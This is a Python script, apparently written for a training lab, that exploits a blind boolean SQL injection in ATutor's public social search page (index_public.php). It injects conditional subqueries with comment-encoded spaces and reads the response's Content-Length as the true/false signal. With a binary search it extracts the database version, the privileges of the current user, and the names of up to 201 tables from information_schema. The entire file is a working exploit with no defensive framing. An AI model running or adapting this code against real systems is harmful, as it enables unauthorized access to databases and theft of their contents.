import requests
import sys
SQL_URL = "http://atutor/ATutor/mods/_standard/social/index_public.php?q="
LOGIN_URL = "http://atutor/ATutor/login.php"
COMMENT="%23"
#sqli = lambda url, query, comment: F"{url}test') OR ({query}){comment}".replace(' ','/**/')
blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
blind_sqli_falsy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=2,({sub_query}),1)){comment}"
ENCODE = lambda s: s.replace(' ','/**/')

QUERIES = {
    'DB_VERSION': "select version()",
    'STRING_EXFIL': lambda sub_query,position, mid: F"ascii(substring(({sub_query}),{position},1))>{mid}", 
    'LENGTH_EXFIL': lambda sub_query,i: F"select length(({sub_query}))={i}",
    'COUNT_EXFIL': lambda sub_query,i: F"SELECT ({sub_query})={i}",
    'CURRENT_USER_IS_DB_ADMIN' : lambda username:  F"SELECT(SELECT COUNT(*) FROM mysql.user WHERE Super_priv ='Y' AND current_user='{username}')>1",
}


def blind_query(ip, sub_query, truth_condition, encode=False, debug=False):
    target = ENCODE(blind_sqli_truthy(ip,sub_query, COMMENT)) if encode else blind_sqli_truthy(ip,sub_query, COMMENT)
    res = requests.get(target)
    if debug == True:
        print("target: ", target)
        print("response headers: ", res.headers)
        print("response: ", res.content)
    return truth_condition(res)

# here we specify the condition that lets us infer the result of a query from the response 
def response_truth_condition(response): 
    content_length = int(response.headers['Content-Length'])
    # in burp the content length is 246 but here it's 180, idk why
    # the error condition response content length is 20 so our truth condition could be content_length > 20 but i prefer to be exact
    if (content_length == 180):
        return True
    return False

def question(ip, sub_query, encode=False, debug=False):
    return blind_query(ip, sub_query, response_truth_condition, encode=encode, debug=debug)
def getLength(ip, sub_query, lower_bound, upper_bound, encode=False):
   for i in range(lower_bound, upper_bound):
        if(question(ip, QUERIES['LENGTH_EXFIL'](sub_query, i), encode=encode, debug=False)):
            return i
def getCount(ip, sub_query, lower_bound, upper_bound, encode=False):
   for i in range(lower_bound, upper_bound):
        if(question(ip, QUERIES['COUNT_EXFIL'](sub_query, i), encode=encode, debug=False)):
            return i
def binary_search(lo, hi, condition):
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if (condition(mid)):
            lo = mid + 1
        else:
            hi = mid - 1
    return lo
def getString(ip, sub_query, string_length, encode=False,verbose=False):
    s = ''
    for position in range(1, string_length+1):
        condition = lambda mid: blind_query(ip, QUERIES['STRING_EXFIL'](sub_query,position,mid), response_truth_condition, encode=encode, debug=False)
        s+=chr(binary_search(32, 126, condition))
        if(verbose == True):
            sys.stdout.write(s[position - 1])
            sys.stdout.flush()
    return s
'''
EXAMPLES
'''
def report():

    #############################################################
    # GET THE LENGTH OF A STRING
    # (USEFUL IS REDUCING THE NUMBER OF REQUESTS) 
    #############################################################
    db_version_strlen = getLength(SQL_URL, "select version()", 1,20, encode=True)
    #############################################################
    # GET THE DB VERSION
    #############################################################
    #print('(+) DB Version:',getString(SQL_URL, "select version()", db_version_strlen, encode=True))
    #getString(SQL_URL, "select version()", 20, verbose=True)
    #############################################################
    # CHECK IF THE CURRENT DB USER HAS ADMIN PRIVILEDGES
    #############################################################
    #blind_query(SQL_URL, queries['CURRENT_USER_IS_DB_ADMIN']('root@localhosts'), response_truth_condition, True, True)
    #print(F"(+) Current User is DB Admin?: ", question(SQL_URL, QUERIES['CURRENT_USER_IS_DB_ADMIN']('root@localhost'), encode=True))
    #############################################################
    # GET NUMBER OF TABLES IN THE CURRENT DB
    #############################################################
    #num_tables = getCount(SQL_URL, "SELECT COUNT(table_name) FROM information_schema.tables", 0, 250, encode=True)
    #print('(+) Table Count: ', num_tables)
    #############################################################
    # EXFIL ALL TABLE NAMES IN DB
    #############################################################
    table_name_lengths = []
    tables = []
    #for i in range (0, num_tables):
    for i in range (0, 201):
        table_name_lengths.append(getLength(SQL_URL, F"SELECT table_name FROM information_schema.tables LIMIT {i},1", 1,40, encode=True))
        #print(i, ":", table_name_lengths[i])
        tables.append(getString(SQL_URL, F"SELECT table_name FROM information_schema.tables LIMIT {i},1", table_name_lengths[i], encode=True))
        print(tables[i], ":", table_name_lengths[i])
    #print(table_name_lengths)
    #
    #for i in range(0, 2):
    #    tables.append(getString(SQL_URL, F"SELECT table_name FROM information_schema.tables LIMIT {i},1", 64, verbose=False))
    #print(tables)

report()